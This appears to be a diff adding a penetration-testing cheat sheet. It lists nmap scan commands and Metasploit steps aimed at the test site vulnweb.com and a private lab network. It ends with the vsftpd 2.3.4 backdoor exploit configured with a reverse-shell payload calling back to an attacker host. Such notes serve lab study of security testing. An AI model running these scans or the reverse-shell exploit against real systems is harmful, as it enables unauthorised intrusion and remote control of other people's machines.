@@ -1,0 +1,51 @@
+COMMANDS:
+
+1.nmap:
+●to perform simple ping
+nmap -sn vulnweb.com
+●to perform SYN scan
+nmap -sS vulnweb.com
+●to identify the service and version
+nmap -sV vulnweb.com
+●to scan a specific port
+nmap -p 80 --script http-headers vulnweb.com
+●to list host in network
+nmap -sL vulnweb.com
+●to perform UDP scan
+nmap -sU vulnweb.com
+●to identify the OS in network
+nmap -O vulnweb.com
+●to perform aggressive scan
+nmap -A vulnweb.com
+●to save output as file
+nmap -oN outputfile.nmap vulnweb.com
+2.Metasploit:
+●For portscan
+msfconsole
+└use auxiliary/scanner/portscan/tcp
+└set RHOSTS vulnweb.com
+└run
+●for version scanning
+msfconsole
+└use auxiliary/scanner/portscan/tcp
+└set RHOSTS vulnweb.com
+└set ports 21,22,80,443
+└set version true
+└run
+●Run Nmap with version detection and save results in Metasploit DB
+NEW TERMINAL: sudo systemctl start postgresql
+psql --version
+sudo pg_ctlcluster <VERSION> main start
+
+msf6 > msfdb init
+msf6 > db_nmap -sV vulnweb.com
+●Search Metasploit modules related to vsftpd (Very Secure File Transfer Protocol Daemon)
+msf6 > search vsftpd
+●Load exploit for vsftpd 2.3.4 backdoor vulnerability
+msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
+└show options
+└set RHOSTS 192.168.56.102
+└show payloads
+└set payload cmd/unix/reverse
+└set LHOST 192.168.56.101
+└run
